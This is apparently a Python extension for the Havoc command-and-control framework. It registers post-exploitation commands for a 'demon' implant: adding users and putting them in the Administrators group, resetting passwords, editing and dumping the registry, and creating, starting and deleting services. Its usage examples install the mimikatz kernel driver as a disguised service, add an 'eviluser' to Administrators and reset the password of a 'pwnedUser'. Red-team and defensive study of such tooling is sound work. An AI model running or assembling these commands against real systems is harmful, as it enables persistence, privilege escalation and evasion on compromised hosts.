from havoc import Demon, RegisterCommand, RegisterModule
import re

def adcs_request( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    adcs_request_ca = ''
    adcs_request_template = ''
    adcs_request_subject = ''
    adcs_request_altname = ''
    adcs_request_install = 0
    adcs_request_machine = 0

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 6:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    if not params[ 0 ].startswith('/CA:'):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid first parameter" )
        return False

    adcs_request_ca = params[ 0 ][len('/CA:'):]

    adcs_request_template = [param[len('/TEMPLATE:'):] for param in params if param.startswith('/TEMPLATE:')]
    if adcs_request_template:
        adcs_request_template = adcs_request_template[0]
    else:
        adcs_request_template = ''

    adcs_request_subject = [param[len('/SUBJECT:'):] for param in params if param.startswith('/SUBJECT:')]
    if adcs_request_subject:
        adcs_request_subject = adcs_request_subject[0]
    else:
        adcs_request_subject = ''

    adcs_request_altname = [param[len('/ALTNAME:'):] for param in params if param.startswith('/ALTNAME:')]
    if adcs_request_altname:
        adcs_request_altname = adcs_request_altname[0]
    else:
        adcs_request_altname = ''

    adcs_request_install = 1 if '/INSTALL' in params else 0
    adcs_request_machine = 1 if '/MACHINE' in params else 0

    packer.addWstr(adcs_request_ca)
    packer.addWstr(adcs_request_template)
    packer.addWstr(adcs_request_subject)
    packer.addWstr(adcs_request_altname)
    packer.addshort(adcs_request_install)
    packer.addshort(adcs_request_machine)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to request an enrollment certificate" )

    demon.InlineExecute( TaskID, "go", f"bin/adcs_request.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def addusertogroup( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    username   = ''
    groupname  = ''
    server     = ''
    domain     = ''

    if num_params < 4:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 4:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    username  = params[ 0 ]
    groupname = params[ 1 ]
    server    = params[ 2 ]
    domain    = params[ 3 ]

    if server == '""':
        server = ''
    if domain == '""':
        domain = ''

    packer.addWstr(domain)
    packer.addWstr(server)
    packer.addWstr(username)
    packer.addWstr(groupname)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to add the user {username} to the {groupname} group" )

    demon.InlineExecute( TaskID, "go", f"bin/addusertogroup.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def enableuser( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    username   = ''
    hostname     = ''

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    username  = params[ 0 ]
    hostname    = params[ 1 ]

    if hostname == '""':
        hostname = ''

    packer.addWstr(hostname)
    packer.addWstr(username)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to enable the user {username}" )

    demon.InlineExecute( TaskID, "go", f"bin/enableuser.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def setuserpass( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    username   = ''
    password   = ''
    computer   = ''

    if num_params < 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    username  = params[ 0 ]
    password  = params[ 1 ]
    computer  = params[ 2 ]

    if computer == '""':
        computer = ''

    packer.addWstr(computer)
    packer.addWstr(username)
    packer.addWstr(password)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to change the password of the user {username} to {password}" )

    demon.InlineExecute( TaskID, "go", f"bin/setuserpass.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def reg_delete( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    reghives = {
        'HKCR': 0,
        'HKCU': 1,
        'HKLM': 2,
        'HKU' : 3
    }

    num_params    = len(params)
    params_parsed = 0
    hostname      = ''
    hive          = ''
    path          = ''
    key           = ''
    delkey        = 0

    if num_params < 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    if params[ params_parsed ].upper() not in reghives:
        hostname = params[ params_parsed ]
        params_parsed += 1

    if params[ params_parsed ].upper() not in reghives:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid Hive value" )
        return False

    hive = reghives[ params[ params_parsed ].upper() ]
    params_parsed += 1

    path = params[ params_parsed ]
    params_parsed += 1

    if num_params > params_parsed:
        key = params[ params_parsed ]
        params_parsed += 1
        delkey = 1
    else:
        delkey = 0

    packer.addstr(hostname)
    packer.adduint32(hive)
    packer.addstr(path)
    packer.addstr(key)
    packer.adduint32(delkey)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to delete a registry entry" )

    demon.InlineExecute( TaskID, "go", f"bin/reg_delete.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def reg_save( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    reghives = {
        'HKCR': 0,
        'HKCU': 1,
        'HKLM': 2,
        'HKU' : 3
    }

    num_params = len(params)
    hive       = ''
    regpath    = ''
    filepath   = ''

    if num_params < 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    if params[ 0 ].upper() not in reghives:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid Hive" )
        return False

    hive     = reghives[ params[ 0 ].upper() ]
    regpath  = params[ 1 ]
    filepath = params[ 2 ]

    packer.addstr(regpath)
    packer.addstr(filepath)
    packer.adduint32(hive)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to save a registry entry" )

    demon.InlineExecute( TaskID, "go", f"bin/reg_save.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def reg_set( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    regtypes = {
        'REG_SZ':  1,
        'REG_EXPAND_SZ':  2,
        'REG_BINARY':  3,
        'REG_DWORD':  4,
        'REG_MULTI_SZ':  7,
        'REG_QWORD':  11
    }

    reghives = {
        'HKCR': 0,
        'HKCU': 1,
        'HKLM': 2,
        'HKU' : 3
    }

    inttypes = {
        'REG_DWORD': 1,
        'REG_QWORD': 1
    }

    params_parsed = 0
    num_params    = len(params)
    hostname      = ''
    hive          = ''
    regpath       = ''
    filepath      = ''
    regstr        = ''

    if num_params < 5:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 6:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    if params[ params_parsed ].upper() not in reghives:
        hostname = f"\\\\{params[ params_parsed ]}"
        params_parsed += 1

    if params[ params_parsed ].upper() not in reghives:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid hive" )
        return False

    hive     = reghives[ params[ params_parsed ].upper() ]
    params_parsed += 1

    path     = params[ params_parsed ]
    params_parsed += 1

    key      = params[ params_parsed ]
    params_parsed += 1

    if params[ params_parsed ].upper() not in regtypes:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid type" )
        return False

    regstr = params[ params_parsed ].upper()
    params_parsed += 1
    _type = regtypes[ regstr ]

    packer.addstr(hostname)
    packer.adduint32(hive)
    packer.addstr(path)
    packer.addstr(key)
    packer.adduint32(_type)

    if regstr in inttypes:
        try:
            data = int( params[ params_parsed ] )
            params_parsed += 1
            assert data <= 0xffffffff
        except Exception as e:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid data" )
            return False
        packer.adduint32(data)
    elif regstr == 'REG_MULTI_SZ':
        data = params[ params_parsed ]
        params_parsed += 1
        words = data.split(' ')
        data = b''
        for word in words:
            data += word.encode('utf-8') + '\x00'
        packer.addbytes(data)
    elif regstr in ['REG_EXPAND_SZ', 'REG_SZ']:
        data = params[ params_parsed ]
        params_parsed += 1
        packer.addstr(data)
    elif regstr == 'REG_BINARY':
        # TODO: implement openf, readb and closef
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "REG_BINARY is not supported" )
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to save a registry entry" )

    demon.InlineExecute( TaskID, "go", f"bin/reg_set.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def sc_create( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    service_type = {
        # SERVICE_FILE_SYSTEM_DRIVER
        1: 0x02,
        # SERVICE_KERNEL_DRIVER,
        2: 0x01,
        # SERVICE_WIN32_OWN_PROCESS
        3: 0x10,
        # SERVICE_WIN32_SHARE_PROCESS
        4: 0x20
    }

    num_params = len(params)
    hostname   = ''
    _type      = service_type[ 3 ] # SERVICE_WIN32_OWN_PROCESS

    if num_params < 6:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 8:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    servicename = params[ 0 ]
    displayname = params[ 1 ]
    binpath     = params[ 2 ]
    desc        = params[ 3 ]
    errormode   = params[ 4 ]
    startmode   = params[ 5 ]
    if num_params == 7:
        try:
            _type = int( params[ 6 ] )
            assert _type in [1, 2, 3, 4]
            _type = service_type[ _type ]
        except Exception as e:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid service type" )
            return False
    if num_params == 8:
        hostname = params[ 7 ]

    if desc == '""':
        desc = ''

    try:
        errormode = int( errormode )
        assert errormode in [0, 1, 2, 3]
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid errormode" )
        return False

    try:
        startmode = int( startmode )
        assert startmode in [2, 3, 4]
    except Exception as e:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid startmode" )
        return False

    packer.addstr(hostname)
    packer.addstr(servicename)
    packer.addstr(binpath)
    packer.addstr(displayname)
    packer.addstr(desc)
    packer.addshort(errormode)
    packer.addshort(startmode)
    packer.addshort(_type)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to create the {servicename} service" )

    demon.InlineExecute( TaskID, "go", f"bin/sc_create.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def sc_start( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    hostname   = ''

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    servicename = params[ 0 ]
    if num_params == 2:
        hostname = params[ 1 ]

    packer.addstr(hostname)
    packer.addstr(servicename)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to start the {servicename} service" )

    demon.InlineExecute( TaskID, "go", f"bin/sc_start.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def sc_stop( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    hostname   = ''

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    servicename = params[ 0 ]
    if num_params == 2:
        hostname = params[ 1 ]

    packer.addstr(hostname)
    packer.addstr(servicename)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to stop the {servicename} service" )

    demon.InlineExecute( TaskID, "go", f"bin/sc_stop.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def sc_delete( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    hostname   = ''

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    servicename = params[ 0 ]
    if num_params == 2:
        hostname = params[ 1 ]

    packer.addstr(hostname)
    packer.addstr(servicename)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to delete the {servicename} service" )

    demon.InlineExecute( TaskID, "go", f"bin/sc_delete.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def sc_description( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    hostname   = ''

    if num_params < 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    servicename = params[ 0 ]
    description = params[ 1 ]

    if num_params == 3:
        hostname = params[ 2 ]

    packer.addstr(hostname)
    packer.addstr(servicename)
    packer.addstr(description)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to set the description of the {servicename} service" )

    demon.InlineExecute( TaskID, "go", f"bin/sc_description.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def adduser( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()
    demon  = Demon( demonID )

    num_params = len(params)
    hostname   = ''

    if num_params < 2:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
        return False

    if num_params > 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
        return False

    username = params[ 0 ]
    password = params[ 1 ]

    if num_params == 3:
        hostname = params[ 2 ]

    packer.addWstr(username)
    packer.addWstr(password)
    packer.addWstr(hostname)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to add the user {username} in {hostname if hostname != '' else 'the local machine'}" )

    demon.InlineExecute( TaskID, "go", f"bin/adduser.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( adcs_request, "", "adcs_request", "Request an enrollment certificate", 0, "/CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:altname] [/INSTALL] [/MACHINE]", "1337 c:\\windwos\\temp\\test.txt" )
RegisterCommand( addusertogroup, "", "addusertogroup", "Add the specified user to the specified group", 0, """<USERNAME> <GROUPNAME> <Server> <DOMAIN>
         USERNAME   Required. The user name to activate/enable. 
         GROUPNAME  Required. The group to add the user to.
         Server     Required. The target computer to perform the addition on. use \"\" for the local machine
         DOMAIN     Required. The domain/computer for the account. You must give 
                    the domain name for the user if it is a domain account, or
                    use \"\" to target an account on the local machine.""", "eviluser Administrators \"\" \"\"" )
RegisterCommand( enableuser, "", "enableuser", "Activates (and if necessary enables) the specified user account on the target computer.", 0, """<USERNAME> <HOSTNAME>
         USERNAME  Required. The user name to activate/enable. 
         HOSTNAME  Required. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account, or
                   use \"\" to target an account on the local machine.""", "disabled_user \"\"" )
RegisterCommand( setuserpass, "", "setuserpass", "Sets the password for the specified user account on the target computer.", 0, """<USERNAME> <PASSWORD> <COMPUTER>
         USERNAME  Required. The user name to activate/enable. 
         PASSWORD  Required. The new password. The password must meet GPO 
                   requirements.
         COMPUTER  Required. The domain/computer for the account. You must give 
                   the domain name for the user if it is a domain account, or
                   use \"\" to target an account on the local machine.""", "pwnedUser Password123! computer132 \"\"" )
RegisterCommand( reg_delete, "", "reg_delete", "Deletes the registry key or value", 0, """<OPT:HOSTNAME> <HIVE> <REGPATH> <OPT:REGVALUE>
         HOSTNAME Optional. The host to connect to and run the commnad on.
         HIVE     Required. The registry hive containing the REGPATH. Possible 
                  values:
                    HKLM
                    HKCU
                    HKU
                    HKCR
         REGPATH  Required. The registry path (deleted if value not given).
         REGVALUE Optional. The registry value to delete. If the value is not 
                  specified, then the whole key is deleted. If you want to 
                  delete the default key, use \"\" as the REGVALUE.""", "HKLM Some\\Path SomeKey" )
RegisterCommand( reg_save, "", "reg_save", "Saves the registry path and all subkeys to disk", 0, """<HIVE> <REGPATH> <FILEOUT>
         HIVE     Required. The registry hive containing the REGPATH. Possible 
                  values:
                    HKLM
                    HKCU
                    HKU
                    HKCR
         REGPATH  Required. The registry path to save.
         FILEOUT  Required. The output file. 
Note:    The FILEOUT is saved to disk on target, so don't forget to clean up.""", "HKLM Some\\Path c:\\windows\\temp\\reg.txt" )
RegisterCommand( reg_set, "", "reg_set", "This command creates or sets the specified registry key (or value) on the target host.", 0, """<OPT:HOSTNAME> <HIVE> <REGPATH> <KEY> <TYPE> <DATA>
         HOSTNAME Optional. The host to connect to and run the commnad on.
         HIVE     Required. The registry hive containing the REGPATH. Possible 
                  values:
                    HKLM
                    HKCU
                    HKU
                    HKCR
         REGPATH  Required. The registry path to save.
         KEY      Required. The registry path. 
         TYPE     Required. The type of registry value to create/set. The valid
                  options are:
                    REG_SZ
                    REG_EXPAND_SZ
                    REG_BINARY
                    REG_DWORD
                    REG_MULTI_SZ
                    REG_QWORD
         DATA     Required. The data to store in the registry value.
Note: For REG_BINARY, the VALUE must be the name of a file on disk which will 
      read in and its contents used.
Note: For REG_MULTI_SZ, the VALUE must be specified as a space separated list 
      of quoted strings.
Note: For REG_QWORD, the VALUE must be less than a DWORD""", "" )
RegisterCommand( sc_create, "", "sc_create", "This command creates a service on the target host.", 0, """<SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>
         SVCNAME      Required. The name of the service to create.
         DISPLAYNAME  Required. The display name of the service.
         BINPATH      Required. The binary path of the service to execute.
         DESCRIPTION  Required. The description of the service.
         ERRORMODE    Required. The error mode of the service. The valid
                      options are:
                        0 - ignore errors
                        1 - normal logging
                        2 - log severe errors
                        3 - log critical errors
         STARTMODE    Required. The start mode for the service. The valid
                      options are:
                        2 - auto start
                        3 - on demand start
                        4 - disabled
         TYPE         Optional. The type of service to create. The valid
                      options are:
                      1 - SERVICE_FILE_SYSTEM_DRIVER (File system driver service)
                      2 - SERVICE_KERNEL_DRIVER (Driver service)
                      3 - SERVICE_WIN32_OWN_PROCESS (Service that runs in its own process) <-- Default
                      4 - SERVICE_WIN32_SHARE_PROCESS (Service that shares a process with one or more other services)
         HOSTNAME     Optional. The host to connect to and run the commnad on. The
                      local system is targeted if a HOSTNAME is not specified.""", "mimidrv mimidrv C:\\Windows\\Temp\\mimidrv.sys \"\" 0 3 2" )
RegisterCommand( sc_start, "", "sc_start", "This command starts the specified service on the target host.", 0, """<SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to start.
         HOSTNAME Optional. The host to connect to and run the command on. The
                  local system is targeted if a HOSTNAME is not specified.""", "mimidrv" )
RegisterCommand( sc_stop, "", "sc_stop", "This command stops the specified service on the target host.", 0, """<SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to stop.
         HOSTNAME Optional. The host to connect to and run the commnad on. The
                  local system is targeted if a HOSTNAME is not specified.""", "mimidrv" )
RegisterCommand( sc_delete, "", "sc_delete", "This command deletes the specified service on the target host.", 0, """<SVCNAME> <OPT:HOSTNAME>
         SVCNAME  Required. The name of the service to delete.
         HOSTNAME Optional. The host to connect to and run the commnad on. The
                  local system is targeted if a HOSTNAME is not specified.""", "mimidrv" )
RegisterCommand( sc_description, "", "sc_description", "This command sets the description of an existing service on the target host.", 0, """<SVCNAME> <DESCRIPTION> <OPT:HOSTNAME>
         SVCNAME      Required. The name of the service to create.
         DESCRIPTION  Required. The description of the service.
         HOSTNAME     Optional. The host to connect to and run the commnad on. The
                      local system is targeted if a HOSTNAME is not specified.""", "mimidrv \"definitely not a mimikatz kernel driver\"" )
RegisterCommand( adduser, "", "adduser", "Add a new user to a machine.", 0, """<USERNAME> <PASSWORD> <SERVER>
         USERNAME   Required. The name of the new user. 
         PASSWORD   Required. The password of the new user. 
         SERVER     Optional. If entered, the user will be created on that machine. If not, the
                    local machine will be used.""", "eviluser Password123 dc01.contoso.local" )
